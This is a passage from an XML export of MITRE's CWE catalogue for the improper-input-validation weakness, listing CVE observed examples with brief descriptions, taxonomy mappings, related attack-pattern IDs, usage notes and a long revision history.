               <ns0:Description>infinite loop from DNS packet with a label that points to itself</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-6870</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1303</ns0:Reference>
               <ns0:Description>missing parameter leads to crash</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1303</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-5893</ns0:Reference>
               <ns0:Description>HTTP request with missing protocol version number leads to crash</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-5893</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-6658</ns0:Reference>
               <ns0:Description>request with missing parameters leads to information exposure</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-6658</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-4114</ns0:Reference>
               <ns0:Description>system crash with offset value that is inconsistent with packet size</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-4114</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-3790</ns0:Reference>
               <ns0:Description>size field that is inconsistent with packet size leads to buffer over-read</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-3790</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2309</ns0:Reference>
               <ns0:Description>product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2309</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3494</ns0:Reference>
               <ns0:Description>security bypass via an extra header</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3494</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3571</ns0:Reference>
               <ns0:Description>empty packet triggers reboot</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3571</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-5525</ns0:Reference>
               <ns0:Description>incomplete denylist allows SQL injection</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2006-5525</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1284</ns0:Reference>
               <ns0:Description>NUL byte in theme name causes directory traversal impact to be worse</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1284</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0600</ns0:Reference>
               <ns0:Description>kernel does not validate an incoming pointer before dereferencing it</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0600</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1738</ns0:Reference>
               <ns0:Description>anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1738</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1737</ns0:Reference>
               <ns0:Description>anti-virus product allows DoS via zero-length field</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1737</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3464</ns0:Reference>
               <ns0:Description>driver does not validate input from userland to the kernel</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3464</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2252</ns0:Reference>
               <ns0:Description>kernel does not validate parameters sent in from userland, allowing code execution</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2252</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2374</ns0:Reference>
               <ns0:Description>lack of validation of string length fields allows memory consumption or buffer over-read</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2374</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1440</ns0:Reference>
               <ns0:Description>lack of validation of length field leads to infinite loop</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1440</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-1625</ns0:Reference>
               <ns0:Description>lack of validation of input to an IOCTL allows code execution</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-1625</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3177</ns0:Reference>
               <ns0:Description>zero-length attachment causes crash</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3177</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-2442</ns0:Reference>
               <ns0:Description>zero-length input causes free of uninitialized pointer</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-2442</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5563</ns0:Reference>
               <ns0:Description>crash via a malformed frame structure</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5563</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5285</ns0:Reference>
               <ns0:Description>infinite loop from a long SMTP request</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5285</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3812</ns0:Reference>
               <ns0:Description>router crashes with a malformed packet</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3812</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3680</ns0:Reference>
               <ns0:Description>packet with invalid version number leads to NULL pointer dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3680</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3660</ns0:Reference>
               <ns0:Description>crash via multiple "." characters in file extension</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3660</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <ns0:Entry_Name>Input validation and representation</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <ns0:Entry_ID>A1</ns0:Entry_ID>
               <ns0:Entry_Name>Unvalidated Input</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>ERR07-C</ns0:Entry_ID>
               <ns0:Entry_Name>Prefer functions that support error checking over equivalent functions that don't</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>FIO30-C</ns0:Entry_ID>
               <ns0:Entry_Name>Exclude user input from format strings</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Abstract</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>MEM10-C</ns0:Entry_ID>
               <ns0:Entry_Name>Define and use a pointer validation function</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="WASC">
               <ns0:Entry_ID>20</ns0:Entry_ID>
               <ns0:Entry_Name>Improper Input Handling</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP25</ns0:Entry_ID>
               <ns0:Entry_Name>Tainted input to variable</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:Related_Attack_Patterns>
            <ns0:Related_Attack_Pattern CAPEC_ID="10" />
            <ns0:Related_Attack_Pattern CAPEC_ID="101" />
            <ns0:Related_Attack_Pattern CAPEC_ID="104" />
            <ns0:Related_Attack_Pattern CAPEC_ID="108" />
            <ns0:Related_Attack_Pattern CAPEC_ID="109" />
            <ns0:Related_Attack_Pattern CAPEC_ID="110" />
            <ns0:Related_Attack_Pattern CAPEC_ID="120" />
            <ns0:Related_Attack_Pattern CAPEC_ID="13" />
            <ns0:Related_Attack_Pattern CAPEC_ID="135" />
            <ns0:Related_Attack_Pattern CAPEC_ID="136" />
            <ns0:Related_Attack_Pattern CAPEC_ID="14" />
            <ns0:Related_Attack_Pattern CAPEC_ID="153" />
            <ns0:Related_Attack_Pattern CAPEC_ID="182" />
            <ns0:Related_Attack_Pattern CAPEC_ID="209" />
            <ns0:Related_Attack_Pattern CAPEC_ID="22" />
            <ns0:Related_Attack_Pattern CAPEC_ID="23" />
            <ns0:Related_Attack_Pattern CAPEC_ID="230" />
            <ns0:Related_Attack_Pattern CAPEC_ID="231" />
            <ns0:Related_Attack_Pattern CAPEC_ID="24" />
            <ns0:Related_Attack_Pattern CAPEC_ID="250" />
            <ns0:Related_Attack_Pattern CAPEC_ID="261" />
            <ns0:Related_Attack_Pattern CAPEC_ID="267" />
            <ns0:Related_Attack_Pattern CAPEC_ID="28" />
            <ns0:Related_Attack_Pattern CAPEC_ID="3" />
            <ns0:Related_Attack_Pattern CAPEC_ID="31" />
            <ns0:Related_Attack_Pattern CAPEC_ID="42" />
            <ns0:Related_Attack_Pattern CAPEC_ID="43" />
            <ns0:Related_Attack_Pattern CAPEC_ID="45" />
            <ns0:Related_Attack_Pattern CAPEC_ID="46" />
            <ns0:Related_Attack_Pattern CAPEC_ID="47" />
            <ns0:Related_Attack_Pattern CAPEC_ID="473" />
            <ns0:Related_Attack_Pattern CAPEC_ID="52" />
            <ns0:Related_Attack_Pattern CAPEC_ID="53" />
            <ns0:Related_Attack_Pattern CAPEC_ID="588" />
            <ns0:Related_Attack_Pattern CAPEC_ID="63" />
            <ns0:Related_Attack_Pattern CAPEC_ID="64" />
            <ns0:Related_Attack_Pattern CAPEC_ID="664" />
            <ns0:Related_Attack_Pattern CAPEC_ID="67" />
            <ns0:Related_Attack_Pattern CAPEC_ID="7" />
            <ns0:Related_Attack_Pattern CAPEC_ID="71" />
            <ns0:Related_Attack_Pattern CAPEC_ID="72" />
            <ns0:Related_Attack_Pattern CAPEC_ID="73" />
            <ns0:Related_Attack_Pattern CAPEC_ID="78" />
            <ns0:Related_Attack_Pattern CAPEC_ID="79" />
            <ns0:Related_Attack_Pattern CAPEC_ID="8" />
            <ns0:Related_Attack_Pattern CAPEC_ID="80" />
            <ns0:Related_Attack_Pattern CAPEC_ID="81" />
            <ns0:Related_Attack_Pattern CAPEC_ID="83" />
            <ns0:Related_Attack_Pattern CAPEC_ID="85" />
            <ns0:Related_Attack_Pattern CAPEC_ID="88" />
            <ns0:Related_Attack_Pattern CAPEC_ID="9" />
         </ns0:Related_Attack_Patterns>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-6" />
            <ns0:Reference External_Reference_ID="REF-166" />
            <ns0:Reference External_Reference_ID="REF-45" />
            <ns0:Reference External_Reference_ID="REF-168" Section="Input Validation Attacks" />
            <ns0:Reference External_Reference_ID="REF-48" />
            <ns0:Reference External_Reference_ID="REF-170" />
            <ns0:Reference External_Reference_ID="REF-7" Section="Chapter 10, &quot;All Input Is Evil!&quot; Page 341" />
            <ns0:Reference External_Reference_ID="REF-1109" />
            <ns0:Reference External_Reference_ID="REF-1110" />
            <ns0:Reference External_Reference_ID="REF-1111" />
            <ns0:Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Discouraged</ns0:Usage>
            <ns0:Rationale>CWE-20 is commonly misused in low-information vulnerability reports when lower-level CWEs could be used instead, or when more details about the vulnerability are available [REF-1287]. It is not useful for trend analysis. It is also a level-1 Class (i.e., a child of a Pillar).</ns0:Rationale>
            <ns0:Comments>Consider lower-level children such as Improper Use of Validation Framework (CWE-1173) or improper validation involving specific types or properties of input such as Specified Quantity (CWE-1284); Specified Index, Position, or Offset (CWE-1285); Syntactic Correctness (CWE-1286); Specified Type (CWE-1287); Consistency within Input (CWE-1288); or Unsafe Equivalence (CWE-1289).</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Frequent Misuse" />
            </ns0:Reasons>
			<ns0:Suggestions>
			  <ns0:Suggestion CWE_ID="1284" Comment="Specified Quantity" />
			  <ns0:Suggestion CWE_ID="1285" Comment="Specified Index, Position, or Offset" />
			  <ns0:Suggestion CWE_ID="1286" Comment="Syntactic Correctness" />
			  <ns0:Suggestion CWE_ID="1287" Comment="Specified Type" />
			  <ns0:Suggestion CWE_ID="1288" Comment="Consistency within Input" />
			  <ns0:Suggestion CWE_ID="1289" Comment="Unsafe Equivalence" />
			  <ns0:Suggestion CWE_ID="116" Comment="Improper Encoding or Escaping of Output" />
			</ns0:Suggestions>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Relationship">
               <html:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</html:p>
            </ns0:Note>
            <ns0:Note Type="Maintenance">As of 2020, this entry is used more often than preferred, and it is a source of frequent confusion. It is being actively modified for CWE 4.1 and subsequent versions.</ns0:Note>
            <ns0:Note Type="Maintenance">Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.</ns0:Note>
            <ns0:Note Type="Maintenance">Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.</ns0:Note>
            <ns0:Note Type="Terminology">
               <html:p>The "input validation" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.</html:p>
               <html:p>Some people use "input validation" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean "checking if an input conforms to expectations without changing it."  CWE uses this more narrow interpretation.</html:p>
            </ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>7 Pernicious Kingdoms</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>Veracode</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-15</ns0:Modification_Date>
               <ns0:Modification_Comment>Suggested OWASP Top Ten 2004 mapping</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-01-12</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-03-10</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-07-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Relationships, Research_Gaps, Terminology_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-04-05</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Research_Gaps, Terminology_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-12-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Description</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-03-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationship_Notes</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-10-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-02-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2013-07-17</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-02-18</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-05-03</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated References</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Potential_Mitigations</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-07-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-06-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Observed_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
